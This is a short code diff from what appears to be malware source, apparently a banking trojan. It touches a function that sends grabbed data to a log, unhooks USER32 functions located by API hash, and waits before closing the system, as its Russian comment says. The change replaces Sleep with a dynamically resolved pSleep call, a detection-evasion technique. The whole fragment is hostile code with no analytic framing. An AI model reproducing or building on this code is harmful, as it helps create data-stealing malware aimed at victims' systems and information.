@@ -134,7 +134,7 @@ static DWORD SendGrabData( ForFindControl* ffc )
 	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
 	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
 	MemFree(ffc);
-	Sleep(10000); //ждем немного и закрываем систему
+	pSleep(10000); //ждем немного и закрываем систему
 
 	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
 	RestoreFuncs( DLL_USER32,  unhook );
